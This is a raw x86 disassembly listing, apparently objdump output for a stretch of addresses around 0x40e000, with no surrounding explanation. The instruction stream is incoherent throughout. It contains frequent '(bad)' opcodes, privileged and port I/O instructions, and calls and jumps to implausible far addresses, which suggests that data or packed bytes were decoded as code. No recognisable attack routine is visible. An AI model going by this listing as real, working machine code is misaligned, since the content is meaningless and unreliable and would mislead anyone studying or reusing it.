  40dfce:	sbb    DWORD PTR [ecx],esp
  40dfd0:	jno    0x40dffd
  40dfd2:	inc    eax
  40dfd3:	push   ss
  40dfd4:	test   cl,ah
  40dfd6:	ret    
  40dfd7:	and    BYTE PTR [eax],0xd1
  40dfda:	add    esi,DWORD PTR [ecx]
  40dfdc:	je     0x40e05c
  40dfde:	pop    DWORD PTR [ebp+0x66b04111]
  40dfe4:	test   BYTE PTR ds:0x2571658f,ch
  40dfea:	sbb    ebp,edx
  40dfec:	adc    DWORD PTR [ebx-0x47f32905],0xffffff8e
  40dff3:	xlat   BYTE PTR ds:[ebx]
  40dff4:	adc    DWORD PTR [ebx-0x62e22961],0xffffff8e
  40dffb:	mov    DWORD PTR [ebx-0x6b296c8d],0xb7008ea1
  40e005:	(bad)  
  40e006:	xchg   ebx,eax
  40e007:	xchg   edi,eax
  40e008:	mov    ebx,0x9d18e616
  40e00d:	cmp    DWORD PTR [edx],0xfffffffc
  40e010:	lahf   
  40e011:	std    
  40e012:	aam    0x9b
  40e014:	cwde   
  40e015:	xlat   BYTE PTR ds:[ebx]
  40e016:	int    0x8e
  40e018:	jns    0x40e060
  40e01a:	hlt    
  40e01b:	add    ebx,esp
  40e01d:	(bad)  
  40e01e:	int3   
  40e01f:	mov    es,WORD PTR ds:0xd942c115
  40e025:	sub    DWORD PTR [ebp-0x30035106],0x1b
  40e02c:	aas    
  40e02d:	jmp    0x40e056
  40e02f:	add    al,0x1
  40e031:	jno    0x40dfd8
  40e033:	ss push esi
  40e035:	cmp    DWORD PTR [eax],0x1c
  40e038:	add    DWORD PTR [edi+0x28],0x4
  40e03c:	(bad)  [eax]
  40e03e:	jmp    0x315ce1
  40e043:	les    ecx,FWORD PTR [edx+ecx*8]
  40e046:	call   FWORD PTR [eax]
  40e048:	mov    esi,0x285107fd
  40e04d:	add    bh,bh
  40e04f:	pop    esi
  40e050:	mov    edx,0xa75652c4
  40e055:	xor    DWORD PTR [ebp+ebx*8-0x56],0x14
  40e05a:	pop    eax
  40e05b:	inc    esi
  40e05c:	mov    bh,0xf
  40e05e:	shl    BYTE PTR [ebp-0x30e31523],0x6d
  40e065:	or     DWORD PTR [eax+0x41],edx
  40e068:	add    BYTE PTR [eax-0x25],bl
  40e06b:	(bad)  
  40e06c:	es and dh,cl
  40e06f:	mov    cl,0x2a
  40e071:	jb     0x40e07c
  40e073:	push   0xbd7232e9
  40e078:	sub    esi,0x2e940ec
  40e07e:	xor    BYTE PTR [ecx+esi*8-0x66],0x5d
  40e083:	jns    0x40e07b
  40e085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e086:	push   0xffffff88
  40e088:	call   0x82a5:0xabc883bf
  40e08f:	push   ebx
  40e090:	jb     0x40e063
  40e092:	xchg   ebx,eax
  40e094:	aad    0x3b
  40e096:	or     DWORD PTR [edx+0xd],ebp
  40e099:	mov    esp,0xe8d107fd
  40e09e:	sar    esi,1
  40e0a0:	mov    esi,0x43fbccfa
  40e0a5:	mov    eax,DWORD PTR [ebx-0xd351e8c]
  40e0ab:	(bad)  
  40e0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0ad:	mov    ah,0xf0
  40e0af:	and    bl,BYTE PTR [esi+0xfe81146]
  40e0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0b6:	cmp    esi,0x3
  40e0b9:	inc    ecx
  40e0ba:	xor    DWORD PTR [eax+eax*1+0x40],0xffffff9e
  40e0bf:	pop    edx
  40e0c0:	(bad)  
  40e0c1:	mov    edi,0xbc75fd93
  40e0c6:	xchg   ebx,eax
  40e0c7:	jae    0x40e0d1
  40e0c9:	mov    al,0x49
  40e0cb:	dec    esi
  40e0cc:	inc    DWORD PTR [eax]
  40e0ce:	(bad)  
  40e0cf:	mov    esi,0x3b0804c0
  40e0d4:	mov    ebp,esp
  40e0d6:	jg     0x40e0f2
  40e0d8:	or     al,0xe8
  40e0da:	mov    BYTE PTR [edi+edi*8],bh
  40e0dd:	inc    DWORD PTR [ebx]
  40e0df:	inc    esi
  40e0e0:	jb     0x40e106
  40e0e2:	loopne 0x40e0ac
  40e0e4:	gs inc ecx
  40e0e6:	or     BYTE PTR [esi],dh
  40e0e8:	call   0xfdd5a809
  40e0ed:	push   eax
  40e0ee:	rol    BYTE PTR ds:0x257eef00,0x56
  40e0f5:	mov    WORD PTR ds:0x7da5ff50,ax
  40e0fc:	out    0x7,al
  40e0fe:	lods   al,BYTE PTR ds:[esi]
  40e0ff:	xchg   esp,eax
  40e100:	std    
  40e101:	call   0x4019de
  40e106:	adc    DWORD PTR [edi+0x6],eax
  40e109:	add    ch,al
  40e10b:	add    bl,ch
  40e10d:	adc    esp,0xffffff91
  40e110:	push   0xfd520200
  40e115:	jne    0x40e0a7
  40e117:	popf   
  40e118:	xor    BYTE PTR [eax+0x7f],dl
  40e11b:	xchg   esp,eax
  40e11c:	xchg   DWORD PTR [ebp+0x6c],eax
  40e11f:	pop    ds
  40e120:	sbb    bh,bh
  40e122:	inc    ebp
  40e123:	test   esi,esp
  40e125:	stos   BYTE PTR es:[edi],al
  40e126:	mov    edi,0x3b6afd94
  40e12b:	xchg   esp,eax
  40e12c:	jae    0x40e136
  40e12e:	shl    ch,0xfd
  40e131:	inc    DWORD PTR [eax]
  40e133:	mov    edi,0x31ff1c1f
  40e138:	and    eax,0x92a7e7fc
  40e13d:	mov    edi,esi
  40e13f:	inc    esi
  40e140:	test   BYTE PTR [esi-0x65883b02],cl
  40e146:	dec    ebx
  40e147:	loope  0x40e143
  40e149:	mov    ecx,eax
  40e14b:	repz data16 add dl,BYTE PTR [ebp-0x46]
  40e150:	(bad)  
  40e151:	jg     0x40e116
  40e153:	sbb    DWORD PTR [eax+0x188b0018],edi
  40e159:	lea    esi,[ecx+edi*1-0x36]
  40e15d:	fwait
  40e15e:	dec    esi
  40e15f:	push   es
  40e160:	enter  0x4479,0xfd
  40e164:	sti    
  40e165:	int    0x55
  40e167:	imul   esi,DWORD PTR [ecx+0x722e8002],0x48594716
  40e171:	and    al,0x41
  40e173:	xor    DWORD PTR [edi+0x7216119a],esi
  40e179:	add    cl,BYTE PTR [ebx]
  40e17b:	icebp  
  40e17c:	xchg   esi,eax
  40e17d:	fcom   DWORD PTR [esi-0x27]
  40e180:	nop
  40e181:	cs (bad) 
  40e183:	mov    esi,0x1173c27b
  40e188:	jmp    0x725ad9d2
  40e18d:	add    ch,bh
  40e18f:	out    0xda,eax
  40e191:	and    ah,BYTE PTR [esi-0x10]
  40e194:	jno    0x40e11f
  40e196:	je     0x40e198
  40e198:	cdq    
  40e199:	push   edi
  40e19a:	adc    BYTE PTR [eax],cl
  40e19c:	cdq    
  40e19d:	int3   
  40e19e:	push   cs
  40e19f:	inc    DWORD PTR [esi-0x7607efb9]
  40e1a5:	inc    edx
  40e1a6:	push   DWORD PTR ss:[esi-0x4a]
  40e1aa:	(bad)  
  40e1ab:	mov    edi,0xfe8aafa8
  40e1b0:	or     WORD PTR [ebx+0x1408265a],bx
  40e1b7:	dec    ebp
  40e1b8:	push   edi
  40e1b9:	not    BYTE PTR [ebx+ecx*4-0x4e7eef3b]
  40e1c0:	idiv   DWORD PTR [edi-0x7b]
  40e1c3:	sub    ebp,DWORD PTR [eax+0x4b]
  40e1c6:	in     al,0x3
  40e1c8:	fcom   QWORD PTR [ebx+0x64f28784]
  40e1ce:	adc    eax,0x25f3311e
  40e1d3:	mov    esp,DWORD PTR [ebp+0x66135111]
  40e1d9:	adc    BYTE PTR [ebp+0x7d],0x75
  40e1dd:	jge    0x40e240
  40e1df:	leave  
  40e1e0:	pop    esp
  40e1e1:	shl    DWORD PTR [edi-0x16c04efd],1
  40e1e7:	movd   mm6,ecx
  40e1ea:	les    esp,FWORD PTR [ecx]
  40e1ec:	jo     0x40e1f7
  40e1ee:	xchg   esi,eax
  40e1ef:	fwait
  40e1f0:	enter  0xe93e,0x3
  40e1f4:	sub    cl,BYTE PTR [ecx-0x6c]
  40e1f7:	fnstsw WORD PTR [edi+0x71]
  40e1fa:	push   es
  40e1fb:	das    
  40e1fc:	add    dh,cl
  40e1fe:	jg     0x40e1e1
  40e200:	ret    
  40e201:	inc    edx
  40e202:	sub    DWORD PTR [eax+0x41],esi
  40e205:	mov    ecx,0xc603e8f0
  40e20a:	mov    esi,0xca171080
  40e20f:	call   0xe5c1ff9e
  40e214:	adc    BYTE PTR [ecx],ch
  40e216:	jno    0x40e1f2
  40e218:	or     eax,0x10d57f96
  40e21d:	mov    DWORD PTR [eax-0x30],esi
  40e220:	xor    al,0x86
  40e222:	jg     0x40e1e8
  40e224:	(bad)  
  40e225:	mov    esi,0x778abdc1
  40e22a:	jg     0x40e22b
  40e22c:	mov    edx,0x34073808
  40e231:	hlt    
  40e232:	out    0xff,eax
  40e234:	call   0x14a89ff4
  40e239:	adc    ecx,edx
  40e23b:	inc    DWORD PTR [eax]
  40e23d:	mov    esp,ebp
  40e23f:	inc    eax
  40e240:	jmp    0x9148d700
  40e245:	inc    edx
  40e246:	add    bh,bh
  40e248:	jle    0x40e25e
  40e24a:	or     DWORD PTR [eax-0x9],ebp
  40e24d:	push   eax
  40e24e:	enter  0xff,0x84
  40e252:	in     al,0x40
  40e254:	jmp    0xb2131804
  40e259:	ins    DWORD PTR es:[edi],dx
  40e25a:	or     eax,ebp
  40e25c:	cmp    eax,0x60fe7e5e
  40e261:	add    BYTE PTR [ecx+0x6d],dh
  40e264:	imul   ebp,ecx,0xa865921a
  40e26a:	xor    dh,cl
  40e26c:	test   al,0xcf
  40e26e:	jne    0x40e279
  40e270:	push   esp
  40e272:	pushf  
  40e273:	mov    BYTE PTR [eax-0x17],0xba
  40e277:	rcl    BYTE PTR [ebx+0x1e],0xab
  40e27b:	xchg   ecx,eax
  40e27c:	inc    esp
  40e27d:	sbb    eax,0x7668092c
  40e282:	adc    al,cl
  40e284:	call   DWORD PTR [eax-0x16bf1ba3]
  40e28a:	stos   DWORD PTR es:[edi],eax
  40e28b:	xor    eax,0x8f5a1d2
  40e290:	call   0xfebf38de
  40e295:	jo     0x40e2f5
  40e297:	jns    0x40e225
  40e299:	and    al,0xd1
  40e29b:	into   
  40e29c:	mov    DWORD PTR [bp+di-0x38],edx
  40e2a0:	inc    DWORD PTR [eax-0x16]
  40e2a3:	jecxz  0x40e2e5
  40e2a5:	add    BYTE PTR [eax+0x40d23391],cl
  40e2ab:	retf   0xe7ff
  40e2ae:	fdivr  QWORD PTR [eax]
  40e2b0:	(bad)  
  40e2b1:	call   ecx
  40e2b3:	cmp    eax,0x991583e8
  40e2b8:	(bad)  
  40e2b9:	jae    0x40e2db
  40e2bb:	test   BYTE PTR [ebx-0x10],bh
  40e2be:	pop    eax
  40e2bf:	push   cs
  40e2c0:	inc    edx
  40e2c1:	xor    DWORD PTR ds:0x73fea1,0x74
  40e2c8:	and    al,BYTE PTR [ecx]
  40e2ca:	add    BYTE PTR [edi+0x1075fdd3],ah
  40e2d0:	mov    ds:0x90974df9,al
  40e2d5:	std    
  40e2d6:	jne    0x40e354
  40e2d8:	nop
  40e2d9:	jae    0x40e2e3
  40e2db:	xor    BYTE PTR [edi],0x4e
  40e2de:	jmp    DWORD PTR [edi-0x70]
  40e2e1:	jae    0x40e2d3
  40e2e3:	ja     0x40e2f3
  40e2e5:	or     al,ch
  40e2e7:	iret   
  40e2e8:	aas    
  40e2e9:	(bad)  
  40e2ea:	push   DWORD PTR [edi]
  40e2ec:	push   cs
  40e2ed:	in     al,dx
  40e2ee:	jmp    FWORD PTR [ebp-0x39c3197f]
  40e2f4:	nop
  40e2f5:	std    
  40e2f6:	(bad)  
  40e2f7:	mov    ebp,0x4075fd9d
  40e2fc:	nop
  40e2fd:	jae    0x40e307
  40e2ff:	xor    BYTE PTR [edi],al
  40e301:	dec    esi
  40e302:	push   DWORD PTR [edi]
  40e304:	nop
  40e305:	jae    0x40e2f3
  40e307:	and    BYTE PTR [edi+ecx*2-0x1],dh
  40e30b:	mov    bh,0x90
  40e30d:	jae    0x40e303
  40e30f:	xor    BYTE PTR [edi+ecx*2-0x1],bh
  40e313:	xchg   edi,eax
  40e314:	nop
  40e315:	jae    0x40e307
  40e317:	add    BYTE PTR [ecx+edx*2],0xff
  40e31b:	ja     0x40e2ad
  40e31d:	jae    0x40e307
  40e31f:	xor    DWORD PTR [eax-0x75],ecx
  40e322:	dec    edi
  40e323:	xchg   BYTE PTR [esi-0x79],cl
  40e326:	je     0x40e3a5
  40e328:	inc    esi
  40e329:	or     eax,0xcd890008
  40e32e:	cmp    edi,edi
  40e330:	outs   dx,BYTE PTR ds:[esi]
  40e331:	push   ss
  40e332:	mov    ebx,0x2d702dc1
  40e337:	mov    ecx,DWORD PTR [ebp-0xe]
  40e33a:	mov    esi,0x1c6fcbfb
  40e33f:	inc    eax
  40e340:	dec    esi
  40e341:	sbb    al,0xfc
  40e343:	out    0x20,eax
  40e345:	push   ds
  40e346:	mov    esi,edi
  40e348:	test   al,0x2c
  40e34a:	mov    BYTE PTR [ecx+0x31],ch
  40e34d:	sbb    al,BYTE PTR [eax+ebp*2]
  40e350:	or     al,0xd
  40e352:	inc    ebx
  40e353:	add    BYTE PTR [ecx-0x4efffd8e],bl
  40e359:	fisubr DWORD PTR [ebx-0x423e9ae]
  40e35f:	mov    edi,0xe8340f85
  40e364:	mov    edx,0x2afe87b8
  40e369:	xor    cl,BYTE PTR [edi]
  40e36b:	sbb    DWORD PTR [ecx+0x5a],esp
  40e36e:	add    al,BYTE PTR [eax]
  40e370:	fdivrp st(4),st
  40e372:	sbb    bl,al
  40e374:	dec    edi
  40e375:	mov    cl,0x2
  40e377:	push   eax
  40e378:	ficomp WORD PTR [ebp-0x563d1806]
  40e37e:	xchg   esi,edi
  40e380:	fdecstp 
  40e382:	xor    bh,bh
  40e384:	(bad)  
  40e385:	or     ecx,DWORD PTR [esi]
  40e387:	cld    
  40e388:	mov    esi,0x26e7fafd
  40e38d:	lods   al,BYTE PTR ds:[esi]
  40e38e:	xchg   esi,edi
  40e390:	add    BYTE PTR [eax+0x30],bh
  40e393:	(bad)  
  40e394:	(bad)  
  40e395:	std    
  40e396:	out    0x96,al
  40e398:	xor    BYTE PTR [ebp+0x9],0xe5
  40e39c:	das    
  40e39d:	or     ecx,DWORD PTR [ecx]
  40e39f:	push   ebx
  40e3a0:	inc    ebp
  40e3a1:	mov    ?,esi
  40e3a3:	loopne 0x40e340
  40e3a5:	ror    dh,0xcd
  40e3a8:	xchg   DWORD PTR [ecx+0x357bc4c6],ebp
  40e3ae:	shl    DWORD PTR [eax],cl
  40e3b0:	inc    ebp
  40e3b1:	xor    DWORD PTR [ecx-0x3722fc0b],ecx
  40e3b7:	inc    eax
  40e3b8:	mov    edx,esp
  40e3ba:	leave  
  40e3bb:	call   0xdc972cee
  40e3c0:	add    esi,DWORD PTR [ecx]
  40e3c2:	adc    BYTE PTR [ecx-0x7f2bedf0],ch
  40e3c8:	fstp   st(0)
  40e3ca:	jnp    0x40e351
  40e3cc:	sti    
  40e3cd:	jbe    0x40e3c4
  40e3cf:	fbstp  TBYTE PTR [ebx]
  40e3d1:	cdq    
  40e3d2:	or     ecx,ebp
  40e3d4:	xchg   esi,eax
  40e3d5:	in     al,0xf0
  40e3d7:	out    0x1e,eax
  40e3d9:	jo     0x40e3e4
  40e3db:	mov    ecx,0x51119d86
  40e3e0:	aad    0x89
  40e3e2:	jl     0x40e439
  40e3e4:	pushf  
  40e3e5:	dec    eax
  40e3e6:	(bad)  [ebp-0x79]
  40e3e9:	cli    
  40e3ea:	aaa    
  40e3eb:	sub    DWORD PTR [ebp-0x9],ecx
  40e3ee:	jnp    0x40e42d
  40e3f0:	xchg   eax,esp
  40e3f2:	stos   BYTE PTR es:[edi],al
  40e3f3:	lock inc BYTE PTR [eax]
  40e3f6:	pop    ebp
  40e3f7:	dec    ecx
  40e3f8:	sub    eax,0x9b7bdd11
  40e3fd:	sti    
  40e3fe:	into   
  40e3ff:	fwait
  40e400:	stos   DWORD PTR es:[edi],eax
  40e401:	xchg   bh,cl
  40e403:	fistp  DWORD PTR [edi]
  40e405:	ret    0x932
  40e408:	mov    ah,0x7a
  40e40a:	retf   0x2c87
  40e40d:	mov    BYTE PTR [edi-0x11],bl
  40e410:	call   0xffbcd72e
  40e415:	jnp    0x40e3c1
  40e417:	arpl   WORD PTR [eax-0x64],ax
  40e41a:	mov    bh,0x7a
  40e41c:	mov    BYTE PTR [ecx+ebp*4],ch
  40e41f:	mov    ?,WORD PTR [edi+esi*1]
  40e422:	dec    ebp
  40e423:	retf   0x68ff
  40e426:	outs   dx,DWORD PTR ds:[esi]
  40e427:	jnp    0x40e49b
  40e429:	sub    DWORD PTR ds:0x2d28671a,ebx
  40e42f:	aam    0xe7
  40e431:	inc    ebp
  40e432:	jns    0x40e4af
  40e434:	(bad)  
  40e435:	loop   0x40e4a9
  40e437:	mul    DWORD PTR [edx]
  40e439:	push   ss
  40e43a:	mov    ebp,0xafa658b3
  40e43f:	push   cs
  40e440:	rcl    BYTE PTR ds:0xe967cb5c,0x32
  40e447:	ins    BYTE PTR es:[edi],dx
  40e448:	mov    ebp,0x40e24d01
  40e44d:	jmp    0xf1b56054
  40e452:	retf   0x77ba
  40e455:	jbe    0x40e406
  40e457:	(bad)  
  40e458:	enter  0x1e,0xb6
  40e45c:	jnp    0x40e459
  40e45e:	sbb    ch,ch
  40e460:	sar    esi,0x5e
  40e463:	mov    bh,0x7b
  40e465:	icebp  
  40e466:	xchg   edx,edi
  40e468:	add    esi,DWORD PTR [ebp+0x29]
  40e46b:	sbb    BYTE PTR [esi],ah
  40e46d:	call   0xfebb2b67
  40e472:	repnz repnz mul BYTE PTR [ebx]
  40e476:	rcl    eax,0xe3
  40e479:	inc    eax
  40e47a:	jmp    0xbad855a1
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	jnp    0x40e4d1
  40e482:	xchg   ecx,eax
  40e483:	xor    cl,BYTE PTR [ecx]
  40e485:	out    dx,eax
  40e486:	push   edi
  40e487:	sub    ah,BYTE PTR [ecx]
  40e489:	addr16 test al,0x32
  40e48c:	fsin   
  40e48e:	add    BYTE PTR ds:0xb083e67e,dh
  40e494:	cmp    ebp,0xffffffe8
  40e497:	or     al,0x33
  40e499:	(bad)  
  40e49a:	push   DWORD PTR [edx+0x5bdde667]
  40e4a0:	test   ch,bh
  40e4a2:	or     ebx,eax
  40e4a4:	sbb    DWORD PTR [eax+ebp*2],esp
  40e4a7:	xor    bl,BYTE PTR [ecx+eax*2]
  40e4aa:	add    BYTE PTR [eax],bh
  40e4ac:	popf   
  40e4ad:	addr16 push ebx
  40e4af:	outs   dx,DWORD PTR ds:[esi]
  40e4b0:	test   BYTE PTR [esi+0x68],cl
  40e4b3:	pop    eax
  40e4b4:	push   es
  40e4b5:	out    dx,eax
  40e4b6:	mov    esi,0x41656cf0
  40e4bb:	dec    eax
  40e4bc:	push   DWORD PTR ss:[ebp+0x0]
  40e4c0:	pusha  
  40e4c1:	sahf   
  40e4c2:	push   edx
  40e4c3:	js     0x40e474
  40e4c5:	test   dh,ah
  40e4c7:	pop    ebp
  40e4c8:	je     0x9166e4cb
  40e4ce:	std    
  40e4cf:	jne    0x40e511
  40e4d1:	sahf   
  40e4d2:	into   
  40e4d3:	dec    esp
  40e4d4:	scas   eax,DWORD PTR es:[edi]
  40e4d5:	test   BYTE PTR [ebp-0x37],bl
  40e4d8:	fimul  DWORD PTR [eax]
  40e4da:	add    BYTE PTR [ebp-0x6d],dl
  40e4dd:	mov    eax,ds:0xf278c481
  40e4e2:	inc    ebx
  40e4e3:	lock enter 0x7384,0xc
  40e4e8:	jo     0x40e48e
  40e4ea:	push   edx
  40e4eb:	jmp    FWORD PTR [edi-0x80]
  40e4ee:	mov    esi,0x7b88fa74
  40e4f3:	cld    
  40e4f4:	fimul  DWORD PTR [ebx]
  40e4f6:	and    ecx,DWORD PTR [ebx-0x7e9b726b]
  40e4fc:	loopne 0x40e54f
  40e4fe:	and    BYTE PTR [ebp+0x31],dh
  40e501:	test   BYTE PTR [ebx+0x10],dh
  40e504:	das    
  40e505:	or     cl,BYTE PTR [eax]
  40e507:	call   0xff7a0a3d
  40e50c:	mov    esi,0xb6fc0f0a
  40e511:	cld    
  40e512:	mov    bh,dh
  40e514:	and    al,0x78
  40e516:	call   0xf48c:0x8372faf4
  40e51d:	jg     0x40e551
  40e51f:	call   0xfec62278
  40e524:	add    BYTE PTR [eax-0x53],bh
  40e527:	idiv   bh
  40e529:	fucom  st(6)
  40e52b:	xchg   esi,eax
  40e52c:	xor    BYTE PTR [ebp+0x57],0x18
  40e530:	add    BYTE PTR [ebx],cl
  40e532:	das    
  40e533:	test   DWORD PTR [ecx+edi*1+0x58],esi
  40e537:	fisttp DWORD PTR [ebx+0x66]
  40e53a:	mov    dl,0x79
  40e53c:	inc    esp
  40e53d:	pop    ebp
  40e53e:	lds    eax,FWORD PTR [ebx]
  40e540:	push   0x31
  40e542:	sbb    ah,cl
  40e544:	lock outs dx,WORD PTR ds:[esi]
  40e547:	sbb    al,BYTE PTR [edx]
  40e549:	xor    DWORD PTR [eax-0x7e],esi
  40e54c:	out    0x40,eax
  40e54e:	inc    eax
  40e54f:	test   esi,edi
  40e551:	sub    dh,BYTE PTR [eax+0x2db83f0e]
  40e557:	mov    WORD PTR [edi-0x53],fs
  40e55a:	pop    es
  40e55b:	inc    ebx
  40e55c:	add    BYTE PTR [esi],bl
  40e55e:	jle    0x40e4ea
  40e560:	out    0x58,eax
  40e562:	sub    eax,DWORD PTR [eax+eax*1]
  40e565:	cmp    ah,BYTE PTR [edx]
  40e567:	mov    db0,esi
  40e56a:	push   esi
  40e56b:	mov    ah,bh
  40e56d:	stos   BYTE PTR es:[edi],al
  40e56e:	mov    edx,0x5a61fe83
  40e573:	das    
  40e574:	leave  
  40e575:	jno    0x40e5d9
  40e577:	sbb    al,BYTE PTR [eax]
  40e579:	xor    edi,ecx
  40e57b:	inc    esp
  40e57c:	imul   esi,DWORD PTR [ecx],0x29748392
  40e582:	or     DWORD PTR [ecx],edx
  40e584:	cdq    
  40e585:	inc    ebp
  40e586:	js     0x40e5a5
  40e588:	fwait
  40e589:	add    BYTE PTR [edi+eax*8-0x1407beb],ah
  40e590:	adc    BYTE PTR [ebx-0x7bfa3864],bl
  40e596:	scas   eax,DWORD PTR es:[edi]
  40e597:	(bad)  
  40e598:	cld    
  40e599:	sbb    DWORD PTR ds:0xeafa0101,0x77
  40e5a0:	in     eax,dx
  40e5a1:	mov    ecx,0xd8e90d70
  40e5a6:	mov    ebx,0x8a486965
  40e5ab:	jecxz  0x40e595
  40e5ad:	in     eax,dx
  40e5ae:	bnd ja 0x40e604
  40e5b1:	or     al,0x89
  40e5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b4:	xor    DWORD PTR [ebx-0x7fdc7d91],eax
  40e5ba:	into   
  40e5bb:	or     cl,ch
  40e5bd:	jb     0x40e55b
  40e5bf:	loope  0x40e616
  40e5c1:	jmp    0x40e5b4
  40e5c3:	or     BYTE PTR [ecx],dl
  40e5c5:	nop
  40e5c6:	xlat   BYTE PTR ds:[ebx]
  40e5c7:	leave  
  40e5c8:	call   0x8141a34f
  40e5cd:	pushf  
  40e5ce:	(bad)  
  40e5cf:	ja     0x40e55e
  40e5d1:	cmp    DWORD PTR [ebp+0x36f98574],0x61
  40e5d8:	scas   al,BYTE PTR es:[edi]
  40e5d9:	iret   
  40e5da:	daa    
  40e5db:	js     0x40e57c
  40e5dd:	inc    esi
  40e5de:	xor    cl,BYTE PTR [ecx]
  40e5e0:	adc    al,0x8f
  40e5e2:	or     cl,BYTE PTR [esp+ebp*1-0x16f66984]
  40e5e9:	jb     0x40e5af
  40e5eb:	ja     0x40e5c8
  40e5ed:	or     eax,DWORD PTR [eax]
  40e5ef:	or     DWORD PTR [ebx-0x5e],esp
  40e5f2:	xor    bh,0x77
  40e5f5:	mov    ebx,0xf0fdee0f
  40e5fa:	imul   esi,DWORD PTR [ecx-0x3c],0xffffffff
  40e5fe:	xor    eax,0xd97476b2
  40e603:	mov    bl,0xfc
  40e605:	pop    es
  40e606:	adc    DWORD PTR [ebx],ecx
  40e608:	(bad)  
  40e609:	(bad)  
  40e60a:	push   ds
  40e60b:	mov    dl,0xfc
  40e60d:	pop    ss
  40e60e:	push   ss
  40e60f:	mov    eax,0x2a94ff1b
  40e614:	popa   
  40e615:	sti    
  40e616:	mov    bl,0xb3
  40e618:	jbe    0x40e681
  40e61a:	pop    ss
  40e61b:	call   0xe807:0x99f5ffc8
  40e622:	ins    DWORD PTR es:[edi],dx
  40e623:	push   esp
  40e624:	or     DWORD PTR [eax],eax
  40e626:	repnz repnz cld 
  40e629:	fs push ecx
  40e62b:	in     eax,0xee
  40e62d:	inc    eax
  40e62e:	jmp    0xe9782e3d
  40e633:	xor    al,BYTE PTR [edx+0x5f5ac144]
  40e639:	data16 sub BYTE PTR ds:0xcad97478,ch
  40e640:	aad    0x39
  40e642:	jmp    0x1e00ea79
  40e647:	cmp    ecx,DWORD PTR [eax*2+0xfccb5a1]
  40e64e:	xchg   esi,eax
  40e64f:	cmp    DWORD PTR [edi],eax
  40e651:	call   0x7687e724
  40e656:	(bad)  
  40e657:	push   0xffffffaa
  40e659:	ja     0x40e6ce
  40e65b:	mov    ch,0xb5
  40e65d:	int    0xfb
  40e65f:	add    DWORD PTR [ecx+ecx*1],esi
  40e662:	out    dx,eax
  40e663:	das    
  40e664:	mov    bl,0xfd
  40e666:	pop    es
  40e667:	push   ecx
  40e668:	push   es
  40e669:	sar    esi,0x5e
  40e66c:	mov    bl,0xfd
  40e66e:	or     edx,DWORD PTR [esi-0x7]
  40e671:	push   cs
  40e672:	call   0xfeb8ca99
  40e677:	add    BYTE PTR [edi+0x71],dh
  40e67a:	cli    
  40e67b:	call   FWORD PTR [ebp-0x6da117fe]
  40e681:	mov    edi,ebp
  40e683:	call   FWORD PTR [ebp-0x338a00ee]
  40e689:	mov    esi,DWORD PTR [ebx+0x8]
  40e68c:	and    BYTE PTR [eax-0x3ad800b8],al
  40e692:	rcl    BYTE PTR [eax+ecx*8],0x51
  40e696:	mov    esp,ebp
  40e698:	sbb    ecx,esi
  40e69a:	not    BYTE PTR [esi+0x1b]
  40e69d:	leave  
  40e69e:	ja     0x40e6eb
  40e6a0:	leave  
  40e6a1:	or     al,BYTE PTR [eax]
  40e6a3:	je     0x40e6a9
  40e6a5:	(bad)  
  40e6a6:	cmp    esi,DWORD PTR [ebx+eax*2+0x4a]
  40e6aa:	(bad)  
  40e6ab:	(bad)  
  40e6ac:	fdivr  QWORD PTR [ebx-0x7f]
  40e6af:	cmp    eax,0x3f44b4
  40e6b4:	mov    BYTE PTR [esi+0x68],bh
  40e6b7:	mov    DWORD PTR [eax],0xfffe891d
  40e6bd:	pop    eax
  40e6be:	or     al,bh
  40e6c0:	inc    ebp
  40e6c1:	mov    al,ds:0x4800000d
  40e6c6:	xchg   DWORD PTR [ebx-0x4],eax
  40e6c9:	or     BYTE PTR [esi+0x6708f843],al
  40e6cf:	(bad)  
  40e6d0:	addr16 jmp 0xa7412635
  40e6d6:	push   ds
  40e6d7:	je     0x40e724
  40e6d9:	pop    ecx
  40e6da:	or     eax,0x4d1cc00b
  40e6df:	cmp    DWORD PTR [ebp-0x60],0x8b3d740d
  40e6e6:	jbe    0x40e6e2
  40e6e8:	add    ah,ch
  40e6ea:	xor    BYTE PTR [ebx+0x1ce46475],cl
  40e6f0:	push   esi
  40e6f1:	xor    ebx,ebp
  40e6f3:	cmp    edi,edi
  40e6f5:	jg     0x40e76f
  40e6f7:	jg     0x40e76e
  40e6f9:	dec    ebp
  40e6fa:	iret   
  40e6fb:	stc    
  40e6fc:	pop    es
  40e6fd:	out    0xbd,al
  40e6ff:	xor    bh,bh
  40e701:	fs push 0x26d7dd6a
  40e707:	sbb    DWORD PTR [ebp-0x32],0xef827abc
  40e70e:	imul   eax,DWORD PTR [ebx-0x9a04684],0x4
  40e715:	mov    dl,0x45
  40e717:	add    dh,BYTE PTR [ebp-0x7a]
  40e71a:	push   cs
  40e71b:	idiv   ebx
  40e71d:	add    BYTE PTR [esi-0xfb505a4],ah
  40e723:	pop    edi
  40e724:	loopne 0x40e6ee
  40e726:	jae    0x40e793
  40e728:	add    dl,BYTE PTR [ebp-0x46]
  40e72b:	pop    ebx
  40e72c:	add    ebx,0x7d
  40e72f:	xor    cl,BYTE PTR [ecx+0x44]
  40e732:	jns    0x40e793
  40e734:	add    al,BYTE PTR [eax]
  40e736:	xor    DWORD PTR [edi+0x6031f3c5],ebp
  40e73c:	add    al,BYTE PTR [eax]
  40e73e:	data16 cmp al,0x14
  40e741:	(bad)  
  40e742:	hlt    
  40e743:	mov    ebx,0xc9556c51
  40e748:	add    ebp,DWORD PTR [edx+0x31]
  40e74b:	sbb    al,BYTE PTR [edx+ebp*2]
  40e74e:	xor    DWORD PTR [edi+0x143efbf5],edx
  40e754:	adc    BYTE PTR [edx+0x31],ch
  40e757:	or     al,BYTE PTR [eax+ebp*8]
  40e75a:	dec    esp
  40e75b:	dec    edx
  40e75c:	add    al,BYTE PTR [eax]
  40e75e:	cmp    ah,BYTE PTR [edx+0x128134f6]
  40e764:	ins    BYTE PTR es:[edi],dx
  40e765:	loopne 0x40e7cc
  40e767:	jecxz  0x40e7e8
  40e769:	mov    BYTE PTR [ecx+ecx*1+0x61],dh
  40e76d:	ficomp DWORD PTR [eax+0x6003d309]
  40e773:	je     0x40e750
  40e775:	jnp    0x40e76e
  40e777:	dec    BYTE PTR [eax+eax*4+0x65]
  40e77b:	add    eax,0x95b03d3
  40e780:	push   ecx
